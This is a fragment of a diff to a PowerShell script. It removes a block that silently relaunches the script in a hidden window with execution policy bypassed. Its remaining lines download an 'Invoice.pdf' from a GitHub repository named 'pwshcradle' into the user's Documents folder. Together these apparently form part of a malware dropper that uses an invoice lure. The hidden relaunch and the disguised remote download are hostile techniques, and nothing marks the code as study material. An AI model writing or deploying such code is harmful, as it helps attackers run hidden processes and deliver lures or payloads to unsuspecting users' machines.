@@ -1,9 +1,3 @@
-if (-not $env:RELAUNCHED) {
-    $env:RELAUNCHED = "1"
-    Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -ErrorAction SilentlyContinue
-    exit
-}
-
 $pdfUrl  = "https://raw.githubusercontent.com/Brothersextremegaming/pwshcradle/refs/heads/main/Invoice.pdf"
 $pdfPath = Join-Path ([Environment]::GetFolderPath("MyDocuments")) "file.pdf"
 
